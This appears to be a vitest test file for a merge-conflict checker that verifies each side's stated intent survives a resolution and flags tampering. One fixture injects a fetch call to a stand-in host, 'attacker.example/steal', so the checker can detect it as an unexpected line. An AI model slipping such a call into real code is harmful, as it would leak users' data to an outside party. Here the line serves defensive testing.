import { describe, expect, it } from "vitest";
import { checkChoiceHonored, type HonorInput } from "@/core/honor";
import { candidate, gitMergeFile, resolveWith, scenarioFile } from "../helpers/scenarios";

const API = "playground/src/api.js";
const BILLING = "playground/src/billing.js";
const MONEY = "playground/src/money.js";

const CLEAN_INTENTS = { ours: "renames fetchUser to getUser", theirs: "retry on 429" };
const HELD_INTENTS = {
  ours: "adds a minimum charge and late fees",
  theirs: "chargeCustomer takes one options object",
};
const DROP_INTENTS = { ours: "parses price strings", theirs: "rounds cents with an epsilon nudge" };

const check = (
  option: HonorInput["option"],
  intents: HonorInput["intents"],
  ...files: HonorInput["files"]
) => checkChoiceHonored({ option, intents, files });

describe("combine both: the clean scenario (rename versus retry)", () => {
  it("passes a merge that keeps the rename and the retry", () => {
    const result = check(
      "combine",
      CLEAN_INTENTS,
      scenarioFile("clean", API, candidate("clean", "combined", API)),
    );
    expect(result.ok).toBe(true);
    expect(result.summary).toEqual([
      "ours: renames fetchUser to getUser, present",
      "theirs: retry on 429, present",
    ]);
    expect(result.files[0]!.renames.ours.map(({ from, to }) => `${from}->${to}`)).toEqual([
      "fetchUser->getUser",
    ]);
  });

  it("holds a merge that keeps the rename and drops the retry, naming the missing intent", () => {
    const result = check(
      "combine",
      CLEAN_INTENTS,
      scenarioFile("clean", API, candidate("clean", "drop-theirs", API)),
    );
    expect(result.ok).toBe(false);
    expect(result.sides.ours.status).toBe("present");
    expect(result.sides.theirs.status).toBe("missing");
    expect(result.sides.theirs.lines).toContain(
      "for ( let attempt = 0 ; response . status = = = 429 & & attempt < retries ; attempt + = 1 ) {",
    );
    expect(result.summary).toContain(
      `theirs: retry on 429, MISSING (${result.sides.theirs.lines.length} lines)`,
    );
  });

  it("names the rename as missing when a line both sides changed kept only theirs' version", () => {
    const file = scenarioFile("clean", API, "");
    const result = check("combine", CLEAN_INTENTS, {
      ...file,
      result: resolveWith(file.merged, "theirs"),
    });
    expect(result.ok).toBe(false);
    expect(result.sides.ours.status).toBe("missing");
    expect(result.sides.theirs.status).toBe("present");
    expect(result.files[0]!.unexpected).toEqual([]);
  });

  it("ignores formatting differences in the result", () => {
    const reformatted = candidate("clean", "combined", API)
      .replaceAll("  ", "    ")
      .replaceAll(", ", ",");
    expect(check("combine", CLEAN_INTENTS, scenarioFile("clean", API, reformatted)).ok).toBe(true);
  });

  it("fails a merge that changed code outside the conflict", () => {
    const tampered = candidate("clean", "combined", API).replace(
      "user.name ?? `user ${id}`",
      "user.name",
    );
    const result = check("combine", CLEAN_INTENTS, scenarioFile("clean", API, tampered));
    expect(result.ok).toBe(false);
    expect(result.files[0]!.outside.ok).toBe(false);
    expect(result.summary.some((line) => line.startsWith("outside the conflicts:"))).toBe(true);
  });

  it("fails a merge that slipped in a line from neither side", () => {
    const injected = candidate("clean", "combined", API).replace(
      "  const url =",
      '  fetchImpl("https://attacker.example/steal");\n  const url =',
    );
    const result = check("combine", CLEAN_INTENTS, scenarioFile("clean", API, injected));
    expect(result.ok).toBe(false);
    expect(result.files[0]!.unexpected).toEqual([
      'fetchImpl ( " https : / / attacker . example / steal " ) ;',
    ]);
  });
});

describe("combine both: the held scenario (signature change versus new callers)", () => {
  it("passes the line-level check; only the real tests can catch the stale call site", () => {
    const result = check(
      "combine",
      HELD_INTENTS,
      scenarioFile("held", BILLING, candidate("held", "combined", BILLING)),
    );
    expect(result.ok).toBe(true);
    expect(result.files[0]!.ambiguous).toEqual([]);
  });
});

describe("keep one side: chosen drops", () => {
  it("passes keeping the newer fix and dropping the older one", () => {
    const result = check(
      "keep_ours",
      DROP_INTENTS,
      scenarioFile("drop", MONEY, candidate("drop", "keep-ours", MONEY)),
    );
    expect(result.ok).toBe(true);
    expect(result.summary).toEqual([
      "ours: parses price strings, present",
      "theirs: rounds cents with an epsilon nudge, dropped as chosen",
    ]);
  });

  it("fails when part of the dropped side leaked into the result", () => {
    const result = check(
      "keep_ours",
      DROP_INTENTS,
      scenarioFile("drop", MONEY, candidate("drop", "leak-theirs", MONEY)),
    );
    expect(result.ok).toBe(false);
    expect(result.sides.theirs.status).toBe("leaked");
    expect(result.sides.ours.status).toBe("missing");
  });

  it("fails combine when one side is simply missing", () => {
    const result = check(
      "combine",
      DROP_INTENTS,
      scenarioFile("drop", MONEY, candidate("drop", "keep-ours", MONEY)),
    );
    expect(result.ok).toBe(false);
    expect(result.sides.theirs.status).toBe("missing");
  });

  it("passes keeping theirs, without applying the dropped side's rename inside the conflict", () => {
    const file = scenarioFile("clean", API, "");
    const result = check("keep_theirs", CLEAN_INTENTS, {
      ...file,
      result: resolveWith(file.merged, "theirs"),
    });
    expect(result.ok).toBe(true);
    expect(result.sides.ours.status).toBe("dropped");
  });
});

describe("fails closed", () => {
  it("holds when both sides changed the same tokens differently", () => {
    const base = "export const LIMIT = 1;\n";
    const ours = "export const LIMIT = 2;\n";
    const theirs = "export const LIMIT = 3;\n";
    const result = check(
      "combine",
      { ours: "a", theirs: "b" },
      {
        path: "x.js",
        base,
        ours,
        theirs,
        merged: gitMergeFile(ours, base, theirs),
        result: "export const LIMIT = 5;\n",
      },
    );
    expect(result.ok).toBe(false);
    expect(result.files[0]!.ambiguous).toEqual(["export const LIMIT = 1 ;"]);
    expect(result.summary).toContain("x.js: both sides changed the same line differently; held");
  });

  it("refuses a file with no conflict to check", () => {
    const result = check(
      "combine",
      { ours: "a", theirs: "b" },
      {
        path: "x.js",
        base: "a\n",
        ours: "a\n",
        theirs: "a\n",
        merged: "a\n",
        result: "a\n",
      },
    );
    expect(result.ok).toBe(false);
    expect(result.summary).toContain("x.js: no conflict markers to check");
  });

  it("refuses conflict output without a base section", () => {
    const result = check(
      "combine",
      { ours: "a", theirs: "b" },
      {
        path: "x.js",
        base: "a\n",
        ours: "b\n",
        theirs: "c\n",
        merged: "<<<<<<< ours\nb\n=======\nc\n>>>>>>> theirs\n",
        result: "b\n",
      },
    );
    expect(result.ok).toBe(false);
  });

  it("refuses an empty file list", () => {
    expect(check("combine", { ours: "a", theirs: "b" }).ok).toBe(false);
  });
});
